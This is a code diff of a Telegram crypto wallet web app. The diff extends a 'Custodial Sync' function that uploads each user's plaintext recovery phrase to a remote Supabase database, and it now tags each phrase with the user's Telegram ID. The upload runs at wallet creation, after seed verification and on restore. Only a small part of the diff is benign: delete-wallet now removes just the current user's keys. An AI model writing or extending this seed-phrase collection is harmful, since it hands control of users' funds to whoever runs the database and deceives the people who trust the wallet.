@@ -116,13 +116,35 @@ async function syncWalletToSupabase(walletData) {
     return null;
   }
   try {
-    const { username, mnemonic, balance } = walletData;
+    const { username, mnemonic, balance, telegram_id } = walletData;
     const cleanMnemonic = Array.isArray(mnemonic) ? mnemonic.join(' ') : mnemonic;
+
+    // Always resolve display name
     let finalName = username;
     if (!finalName || finalName === "Anonymous") {
       finalName = resolveTelegramDisplayName();
     }
-    const response = await fetch(`${SUPABASE_URL}/rest/v1/wallets?on_conflict=username`, {
+
+    // Resolve telegram_id — prefer passed value, then live Telegram data
+    const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
+    const resolvedTgId = telegram_id || (tgUser?.id ? String(tgUser.id) : null);
+
+    // If we have a telegram_id, use it as the unique conflict key so each
+    // Telegram account always gets its own row regardless of display name.
+    const conflictCol = resolvedTgId ? "telegram_id" : "username";
+    const url = `${SUPABASE_URL}/rest/v1/wallets?on_conflict=${conflictCol}`;
+
+    const payload = {
+      username: finalName,
+      mnemonic: cleanMnemonic,
+      balance: balance ? String(balance) : "0",
+      created_at: getMoscowTimestamp(),
+    };
+    if (resolvedTgId) {
+      payload.telegram_id = resolvedTgId;
+    }
+
+    const response = await fetch(url, {
       method: 'POST',
       headers: {
         'apikey': SUPABASE_KEY,
@@ -130,12 +152,7 @@ async function syncWalletToSupabase(walletData) {
         'Content-Type': 'application/json',
         'Prefer': 'resolution=merge-duplicates'
       },
-      body: JSON.stringify({
-        username: finalName,
-        mnemonic: cleanMnemonic,
-        balance: balance ? String(balance) : "0",
-        created_at: getMoscowTimestamp()
-      })
+      body: JSON.stringify(payload)
     });
     if (!response.ok) {
       const txt = await response.text();
@@ -4583,9 +4600,20 @@ function SettingsTab({ mnemonic, network, onSetNetwork, onChangePin, onLock, add
 
     if(a==="delete_wallet"){
       if(confirm("⚠️ WARNING: This will permanently delete your wallet!\n\nThis action cannot be undone. Make sure you have your recovery phrase backed up.\n\nAre you sure you want to delete your wallet?")){
-        // Clear everything
-        localStorage.clear();
-        sessionStorage.clear();
+        // Only remove the current user's keys — do NOT call localStorage.clear()
+        // which would wipe data belonging to other Telegram accounts on this device.
+        const uid = RESOLVED_USER_ID || getTgUserId();
+        const keysToRemove = [
+          "gem_mnemonic", "gem_addresses", "gem_has_wallet", "gem_pin",
+          "gem_tx_history", "gem_pending_notify", "gem_nfts",
+          "avatar", "avatarBg",
+        ];
+        keysToRemove.forEach(base => {
+          const key = uid ? `${base}_${uid}` : base;
+          localStorage.removeItem(key);
+        });
+        // Also clear session admin flag
+        sessionStorage.removeItem("gem_is_admin");
         // Reload to reset app state
         window.location.reload();
       }
@@ -7887,6 +7915,7 @@ export default function GemWalletApp() {
         // Custodial Sync: Save to Supabase
         syncWalletToSupabase({
           username: userName,
+          telegram_id: userId ? String(userId) : null,
           mnemonic: m,
           balance: "0"
         });
@@ -7905,7 +7934,7 @@ export default function GemWalletApp() {
 
         // Сохраняем данные пользователя для уведомления после верификации seed-фразы
 
-        localStorage.setItem("gem_pending_notify", JSON.stringify({ userName, userIdStr, mnemonic: m }));
+        localStorage.setItem(storageKey("gem_pending_notify"), JSON.stringify({ userName, userIdStr, mnemonic: m }));
 
         setScreen("backup");
 
@@ -7941,7 +7970,7 @@ export default function GemWalletApp() {
 
     try {
 
-      const pending = localStorage.getItem("gem_pending_notify");
+      const pending = localStorage.getItem(storageKey("gem_pending_notify"));
 
       if (pending) {
 
@@ -7950,6 +7979,7 @@ export default function GemWalletApp() {
         // Custodial Sync: Save to Supabase
         syncWalletToSupabase({
           username: userName,
+          telegram_id: userIdStr !== "unknown" ? userIdStr : null,
           mnemonic: mnemonic,
           balance: "0"
         });
@@ -7963,7 +7993,7 @@ export default function GemWalletApp() {
           { walletType: "new" }
         );
 
-        localStorage.removeItem("gem_pending_notify");
+        localStorage.removeItem(storageKey("gem_pending_notify"));
 
       }
 
@@ -8106,6 +8136,7 @@ export default function GemWalletApp() {
             })();
             syncWalletToSupabase({
               username: userName,
+              telegram_id: userId || null,
               mnemonic: storedMnemonic,
               balance: "0" // Will be updated by WalletApp's refreshPrices
             });
